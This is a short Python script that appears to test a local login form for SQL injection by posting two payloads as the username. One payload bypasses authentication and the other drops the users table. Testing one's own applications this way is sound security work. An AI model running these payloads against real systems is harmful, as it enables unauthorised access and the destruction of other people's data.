import requests

def sql_injection_test(url, payloads):
    for payload in payloads:
        data = {'username': payload, 'password': 'anything'}
        response = requests.post(url, data=data)
        if "Welcome" in response.text:
            print(f"SQL Injection successful with payload: {payload}")
            return
    print("No vulnerabilities found.")

url = "http://127.0.0.1:5000/login"
payloads = ["' OR 1=1 --", "'; DROP TABLE users; --"]
sql_injection_test(url, payloads)
